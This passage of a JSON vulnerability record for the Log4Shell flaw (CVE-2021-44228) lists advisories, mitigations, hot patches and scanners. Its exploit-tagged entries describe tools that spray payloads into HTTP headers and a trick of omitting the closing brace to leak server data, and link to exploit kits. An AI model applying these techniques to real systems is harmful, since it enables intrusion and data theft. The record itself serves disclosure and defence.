        "name": "http://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html",
        "url": "http://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://research.kudelskisecurity.com/2021/12/10/log4shell-critical-severity-apache-log4j-remote-code-execution-being-actively-exploited-cve-2021-44228/",
        "url": "https://research.kudelskisecurity.com/2021/12/10/log4shell-critical-severity-apache-log4j-remote-code-execution-being-actively-exploited-cve-2021-44228/"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "Remote code injection in Log4j",
        "url": "https://github.com/advisories/GHSA-jfh8-c2jp-5v3q"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "PSA: Log4Shell and the current state of JNDI injection",
        "url": "https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "Widespread Exploitation of Critical Remote Code Execution in Apache Log4j",
        "url": "https://www.rapid7.com/blog/post/2021/12/10/widespread-exploitation-of-critical-remote-code-execution-in-apache-log4j/"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://isc.sans.edu/diary/rss/28120",
        "url": "https://isc.sans.edu/diary/rss/28120"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://www.veracode.com/blog/security-news/urgent-analysis-and-remediation-guidance-log4j-zero-day-rce-cve-2021-44228",
        "url": "https://www.veracode.com/blog/security-news/urgent-analysis-and-remediation-guidance-log4j-zero-day-rce-cve-2021-44228"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://www.blumira.com/cve-2021-44228-log4shell/",
        "url": "https://www.blumira.com/cve-2021-44228-log4shell/"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://news.ycombinator.com/item?id=29542896",
        "url": "https://news.ycombinator.com/item?id=29542896"
      },
      {
        "refsource": "EXPLOIT",
        "name": "https://twitter.com/TomAnthonySEO/status/1470374984749133825",
        "url": "https://twitter.com/TomAnthonySEO/status/1470374984749133825",
        "content": "Interesting Log4j payload I discovered, simply omit the closing brace }, and now you will potentially get a bunch of data exfiltrated to your server until the next } appears in that data. Had it work on a FANG target",
        "timestamp": "2021-12-13"
      },
      {
        "refsource": "HOTPATCH",
        "name": "log4j-jndi-be-gone",
        "url": "https://github.com/nccgroup/log4j-jndi-be-gone",
        "content": "A Byte Buddy Java agent-based fix for CVE-2021-44228, the log4j 2.x \"JNDI LDAP\" vulnerability.\n\nIt does three things:\n\n* Disables the internal method handler for jndi: format strings (\"lookups\").\n* Logs a message to System.err (i.e stderr) indicating that a log4j JNDI attempt has been made (including the format string attempted, with any ${} characters sanitized to prevent transitive injections).\n* Resolves the format string to \"(log4j jndi disabled)\" in the log message (to prevent transitive injections)."
      },
      {
        "refsource": "EXPLOITATION",
        "name": "Exploitation of Log4j CVE-2021-44228 before public disclosure and evolution of evasion and exfiltration",
        "url": "https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns/"
      },
      {
        "refsource": "PREVENTION",
        "name": "log4jail",
        "url": "https://github.com/mufeedvh/log4jail",
        "content": "A fast firewall reverse proxy with TLS (HTTPS) and swarm support for preventing Log4J (Log4Shell aka CVE-2021-44228) attacks."
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://sysdig.com/blog/exploit-detect-mitigate-log4j-cve/",
        "url": "https://sysdig.com/blog/exploit-detect-mitigate-log4j-cve/"
      },
      {
        "refsource": "DETECTION",
        "name": "https://github.com/jfrog/log4j-tools",
        "url": "https://github.com/jfrog/log4j-tools"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/",
        "url": "https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/"
      },
      {
        "refsource": "CONFIRMATION",
        "name": "https://research.nccgroup.com/2021/12/12/log4j-jndi-be-gone-a-simple-mitigation-for-cve-2021-44228/",
        "url": "https://research.nccgroup.com/2021/12/12/log4j-jndi-be-gone-a-simple-mitigation-for-cve-2021-44228/"
      },
      {
        "refsource": "PROTECTION",
        "name": "https://blog.cloudflare.com/log4j-cloudflare-logs-mitigation/",
        "url": "https://blog.cloudflare.com/log4j-cloudflare-logs-mitigation/"
      },
      {
        "refsource": "EXPLOIT",
        "name": "https://github.com/cyberstruggle/L4sh",
        "url": "https://github.com/cyberstruggle/L4sh",
        "content": "Log4Shell RCE Exploit - fully independent exploit does not require any 3rd party binaries. The exploit spraying the payload to all possible logged HTTP Headers such as X-Forwarding , Server-IP , User-Agent"
      },
      {
        "refsource": "EXPLOITATION",
        "name": "https://www.catonetworks.com/blog/log4j-a-look-into-threat-actors-exploitation-attempts/",
        "url": "https://www.catonetworks.com/blog/log4j-a-look-into-threat-actors-exploitation-attempts/"
      },
      {
        "refsource": "PRESS",
        "name": "https://www.wired.com/story/log4j-log4shell/",
        "url": "https://www.wired.com/story/log4j-log4shell/"
      },
      {
        "refsource": "PRESS",
        "name": "https://www.theregister.com/2021/12/13/log4j_rce_latest/",
        "url": "https://www.theregister.com/2021/12/13/log4j_rce_latest/"
      },
      {
        "refsource": "DETECTION",
        "name": "https://github.com/zsolt-halo/Log4J-Log4Shell-CVE-2021-44228-Spring-Boot-Test-Service",
        "url": "https://github.com/zsolt-halo/Log4J-Log4Shell-CVE-2021-44228-Spring-Boot-Test-Service",
        "content": "This is a dirty hack spring boot hello world proejct to test your tooling/payloads/detection capabilities locally before you hit production targets with them.\n\nThe configured Log4j version is 2.13.0"
      },
      {
        "refsource": "ATTACK_WALKTHROUGH",
        "name": "https://chasersystems.com/discrimiNAT/blog/log4shell-and-its-traces-in-a-network-egress-filter/",
        "url": "https://chasersystems.com/discrimiNAT/blog/log4shell-and-its-traces-in-a-network-egress-filter/"
      },
      {
        "refsource": "PRESS",
        "name": "https://www.theregister.com/2021/12/15/log4j_latest_cisa/",
        "url": "https://www.theregister.com/2021/12/15/log4j_latest_cisa/"
      },
      {
        "refsource": "SCANNER",
        "name": "log4jScanner",
        "url": "https://github.com/proferosec/log4jScanner",
        "content": "This tool provides you with the ability to scan internal (only) subnets for vulnerable log4j web services. It will attempt to send a JNDI payload to each discovered web service (via the methods outlined below) to a list of common HTTP/S ports. For every response it receives, it will log the responding host IP so we can get a list of the vulnerable servers.\n\nIf there is a \"SUCCESS\", this means that some web service has received the request, was vulnerable to the log4j exploit and sent a request to our TCP server.\n\nThe tool does not send any exploits to the vulnerable hosts, and is designed to be as passive as possible."
      }
    ],
    "reporter": "kurtseifried",
    "reporter_id": 582211,
    "notes": "",
    "description": "This vulnerability was not correctly fixed \"in certain non-default configuration\" and a new vulnerability and patch have been released, please see GSD-2021-1002353 (CVE-2021-45046). Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. \n\n In log4j 2.15.1 and later JNDI will be disabled by default:\n\n \"Dealing with CVE-2021-44228 has shown the JNDI has significant security issues. While we have mitigated what we are aware of it would be safer for users to completely disable it by default, especially since the large majority are unlikely to be using it. Those who are will need to specify -Dlog4j2.enableJndi=true or the environment variable form of it to use any JNDI components.\" (https://issues.apache.org/jira/browse/LOG4J2-3208)\n\n In previous releases (>2.10) this behavior can be mitigated by setting system property \"log4j2.formatMsgNoLookups\" to \"true\" or by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class). Java 8u121 (see https://www.oracle.com/java/technologies/javase/8u121-relnotes.html) protects against remote code execution by defaulting \"com.sun.jndi.rmi.object.trustURLCodebase\" and \"com.sun.jndi.cosnaming.object.trustURLCodebase\" to \"false\".\n\n Later versions of the Oracle Java JDK are not affected by the LDAP attack vector, but other vectors are available for exploitation: \"JDK versions greater than 6u211, 7u201, 8u191, and 11.0.1 are not affected by the LDAP attack vector but please note this still leaves other attack vectors. In these versions com.sun.jndi.ldap.object.trustURLCodebase is set to \"false\" meaning JNDI cannot load remote code using LDAP.\" (https://www.lunasec.io/docs/blog/log4j-zero-day/)\n\n Also please note that log4j version 1.x is not affected by this specific vulnerability it does have a number of known serious security flaws and likely also contains Remote Code Execution vulnerabilities, upgrading it should be investigated.\n\nHot patches:\n\nThere are currently several projects providing hot patches that can modify a running system to remove the vulnerability and are OpenSource licensed allowing them to be easily audited:\n\nLog4jHotPatch\n\n\"This is a tool which injects a Java agent into a running JVM process. The agent will attempt to patch the lookup() method of all loaded org.apache.logging.log4j.core.lookup.JndiLookup instances to unconditionally return the string \"Patched JndiLookup::lookup()\". It is designed to address the CVE-2021-44228 remote code execution vulnerability in Log4j without restarting the Java process. The dynamic and static agents are known to run on JDK 8 & 11 on Linux whereas on JDK 17 only the static agent is working (see below)\" (https://github.com/corretto/hotpatch-for-apache-log4j2)\n\nLogout4Shell\n\n\"However, enabling these system property requires access to the vulnerable servers as well as a restart. The Cybereason research team has developed the following code that exploits the same vulnerability and the payload therein forces the logger to reconfigure itself with the vulnerable setting disabled - this effectively blocks any further attempt to exploit Log4Shell on this server.\" (https://github.com/Cybereason/Logout4Shell)\n\nDetection\n\nPlease see the GSD reference links tagged with \"DETECTION\" for more information (there are to many to list here).\n\nTOP LINKS:\n\n Best list of vulnerable software: https://github.com/NCSC-NL/log4shell/tree/main/software\n\n Best list of vulnerable services: https://github.com/YfryTchsGD/Log4jAttackSurface\n\n Best hotpatch:\n\n https://github.com/corretto/hotpatch-for-apache-log4j2\n\n Best detection:\n\n grep: https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b\n\n jarhashes: https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes\n\n semgrep: https://github.com/returntocorp/semgrep-rules/pull/1650/commits/ecfc32623eec718d61ec83b9196574f333191008/\n\n yara: https://github.com/timb-machine/log4j/\n\n burpsuite: https://github.com/silentsignal/burp-log4shell\n\n Nmap NSE: https://github.com/Diverto/nse-log4shell\n\n Scanners: \n https://github.com/alexbakker/log4shell-tools\n https://github.com/fullhunt/log4j-scan\n https://github.com/takito1812/log4j-detect\n\nExploitation:\n\nAn exploit kit is available at https://github.com/pimps/JNDI-Exploit-Kit and it has also been reported that omitting the closing } can result in data from other requests being sent as some servers with log4j2 will apparently keep sending data until they find a closing }."
  },
  "cve.org": {
    "CVE_data_meta": {
      "ASSIGNER": "security@apache.org",
      "ID": "CVE-2021-44228",
      "STATE": "PUBLIC",
      "TITLE": "Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints"
    },
    "affects": {
      "vendor": {
        "vendor_data": [
          {
            "vendor_name": "Apache Software Foundation",
            "product": {
              "product_data": [
                {
                  "product_name": "Apache Log4j",
                  "version": {
                    "version_data": [
                      {
                        "version_name": "Apache Log4j 2",
                        "version_affected": ">=",
                        "version_value": "2.0-beta9",
                        "platform": ""
                      },
                      {
                        "version_name": "Apache Log4j 2",
                        "version_affected": "<=",
                        "version_value": "2.12.1",
                        "platform": ""
                      },
                      {
                        "version_name": "Apache Log4j 2",
                        "version_affected": ">=",
                        "version_value": "2.13.0",
                        "platform": ""
                      },
                      {
                        "version_name": "Apache Log4j 2",
                        "version_affected": "<=",
                        "version_value": "2.14.1",
                        "platform": ""
                      }
                    ]
                  }
                }
              ]
            }
          }
        ]
      }
    },
    "credit": [
      {
        "lang": "eng",
        "value": "This issue was discovered by Chen Zhaojun of Alibaba Cloud Security Team."
      }
    ],
    "data_format": "MITRE",
    "data_type": "CVE",
    "data_version": "4.0",
    "description": {
      "description_data": [
        {
          "lang": "eng",
          "value": "Apache Log4j2 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0, this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects."
        }
      ]
    },
    "generator": {
      "engine": "Vulnogram 0.0.9"
    },
    "impact": [
      {
        "other": "critical"
      }
    ],
    "problemtype": {
      "problemtype_data": [
        {
          "description": [
            {
              "lang": "eng",
              "value": "CWE-502 Deserialization of Untrusted Data"
            }
          ]
        },
        {
          "description": [
            {
              "lang": "eng",
              "value": "CWE-400 Uncontrolled Resource Consumption"
            }
          ]
        },
        {
          "description": [
            {
              "lang": "eng",
              "value": "CWE-20 Improper Input Validation"
            }
          ]
        }
      ]
    },
    "references": {
      "reference_data": [
        {
          "refsource": "MISC",
          "url": "https://logging.apache.org/log4j/2.x/security.html",
          "name": "https://logging.apache.org/log4j/2.x/security.html"
        },
        {
          "refsource": "MLIST",
          "name": "[oss-security] 20211210 CVE-2021-44228: Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints",
          "url": "http://www.openwall.com/lists/oss-security/2021/12/10/1"
        },
        {
          "refsource": "MLIST",
          "name": "[oss-security] 20211210 Re: CVE-2021-44228: Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints",
          "url": "http://www.openwall.com/lists/oss-security/2021/12/10/2"
        },
        {
          "refsource": "CISCO",
          "name": "20211210 Vulnerability in Apache Log4j Library Affecting Cisco Products: December 2021",
          "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd"
        },
        {
          "refsource": "MLIST",
          "name": "[oss-security] 20211210 Re: CVE-2021-44228: Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints",
          "url": "http://www.openwall.com/lists/oss-security/2021/12/10/3"
        },
        {
          "refsource": "CONFIRM",
          "name": "https://security.netapp.com/advisory/ntap-20211210-0007/",
          "url": "https://security.netapp.com/advisory/ntap-20211210-0007/"
        },
        {
          "refsource": "CONFIRM",
          "name": "https://security.netapp.com/advisory/ntap-20211210-0007/",
          "url": "https://security.netapp.com/advisory/ntap-20211210-0007/"
        },
        {
          "refsource": "MISC",
          "name": "http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html",
          "url": "http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html"
        },
        {
          "refsource": "MISC",
          "name": "http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html",
          "url": "http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html"
        },
        {
          "refsource": "CONFIRM",
          "name": "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0032",
          "url": "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0032"
        },
        {
          "refsource": "CONFIRM",
          "name": "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0032",
          "url": "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0032"
        },
        {
          "refsource": "CONFIRM",
          "name": "https://www.oracle.com/security-alerts/alert-cve-2021-44228.html",
          "url": "https://www.oracle.com/security-alerts/alert-cve-2021-44228.html"
        },
        {
          "refsource": "DEBIAN",
          "name": "DSA-5020",
          "url": "https://www.debian.org/security/2021/dsa-5020"
        },
        {
          "refsource": "MLIST",
          "name": "[debian-lts-announce] 20211212 [SECURITY] [DLA 2842-1] apache-log4j2 security update",
          "url": "https://lists.debian.org/debian-lts-announce/2021/12/msg00007.html"
        },
        {
          "refsource": "FEDORA",
          "name": "FEDORA-2021-f0f501d01f",
          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VU57UJDCFIASIO35GC55JMKSRXJMCDFM/"
        },
        {
          "refsource": "MS",
          "name": "Microsoft\u2019s Response to CVE-2021-44228 Apache Log4j 2",
          "url": "https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/"
        },
        {
          "refsource": "MLIST",
          "name": "[oss-security] 20211213 Re: CVE-2021-4104: Deserialization of untrusted data in JMSAppender in Apache Log4j 1.2",
          "url": "http://www.openwall.com/lists/oss-security/2021/12/13/2"
        },
        {
          "refsource": "MLIST",
          "name": "[oss-security] 20211213 CVE-2021-4104: Deserialization of untrusted data in JMSAppender in Apache Log4j 1.2",
          "url": "http://www.openwall.com/lists/oss-security/2021/12/13/1"
        },
        {
          "refsource": "MLIST",
          "name": "[oss-security] 20211214 CVE-2021-45046: Apache Log4j2 Thread Context Message Pattern and Context Lookup Pattern vulnerable to a denial of service attack",
          "url": "http://www.openwall.com/lists/oss-security/2021/12/14/4"
        },
        {
          "refsource": "CERT-VN",
          "name": "VU#930724",
          "url": "https://www.kb.cert.org/vuls/id/930724"
        },
        {
          "refsource": "MISC",
          "name": "https://twitter.com/kurtseifried/status/1469345530182455296",
          "url": "https://twitter.com/kurtseifried/status/1469345530182455296"
        },
        {
          "refsource": "CONFIRM",
          "name": "https://cert-portal.siemens.com/productcert/pdf/ssa-661247.pdf",
          "url": "https://cert-portal.siemens.com/productcert/pdf/ssa-661247.pdf"
        },
        {
          "refsource": "MISC",
          "name": "http://packetstormsecurity.com/files/165260/VMware-Security-Advisory-2021-0028.html",
          "url": "http://packetstormsecurity.com/files/165260/VMware-Security-Advisory-2021-0028.html"
        },
        {
          "refsource": "MISC",
          "name": "http://packetstormsecurity.com/files/165270/Apache-Log4j2-2.14.1-Remote-Code-Execution.html",
          "url": "http://packetstormsecurity.com/files/165270/Apache-Log4j2-2.14.1-Remote-Code-Execution.html"
        },
        {
          "refsource": "MISC",
          "name": "http://packetstormsecurity.com/files/165261/Apache-Log4j2-2.14.1-Information-Disclosure.html",
          "url": "http://packetstormsecurity.com/files/165261/Apache-Log4j2-2.14.1-Information-Disclosure.html"
        },
        {
          "refsource": "CONFIRM",
          "name": "https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00646.html",
          "url": "https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00646.html"
        },
        {
          "refsource": "MISC",
          "name": "http://packetstormsecurity.com/files/165282/Log4j-Payload-Generator.html",
          "url": "http://packetstormsecurity.com/files/165282/Log4j-Payload-Generator.html"
        },
        {
          "refsource": "MISC",
          "name": "http://packetstormsecurity.com/files/165281/Log4j2-Log4Shell-Regexes.html",
          "url": "http://packetstormsecurity.com/files/165281/Log4j2-Log4Shell-Regexes.html"
        },
        {
          "refsource": "MISC",
          "name": "http://packetstormsecurity.com/files/165307/Log4j-Remote-Code-Execution-Word-Bypassing.html",
          "url": "http://packetstormsecurity.com/files/165307/Log4j-Remote-Code-Execution-Word-Bypassing.html"
        },
        {
          "refsource": "MISC",
          "name": "http://packetstormsecurity.com/files/165311/log4j-scan-Extensive-Scanner.html",
          "url": "http://packetstormsecurity.com/files/165311/log4j-scan-Extensive-Scanner.html"
        },
        {
          "refsource": "MISC",
          "name": "http://packetstormsecurity.com/files/165306/L4sh-Log4j-Remote-Code-Execution.html",
          "url": "http://packetstormsecurity.com/files/165306/L4sh-Log4j-Remote-Code-Execution.html"
        },
        {
          "refsource": "MLIST",
          "name": "[oss-security] 20211215 Re: CVE-2021-45046: Apache Log4j2 Thread Context Message Pattern and Context Lookup Pattern vulnerable to a denial of service attack",
          "url": "http://www.openwall.com/lists/oss-security/2021/12/15/3"
        },
        {
          "refsource": "CONFIRM",
          "name": "https://cert-portal.siemens.com/productcert/pdf/ssa-714170.pdf",
          "url": "https://cert-portal.siemens.com/productcert/pdf/ssa-714170.pdf"
        }
      ]
    },
    "source": {
      "discovery": "UNKNOWN"
    }
  }
}
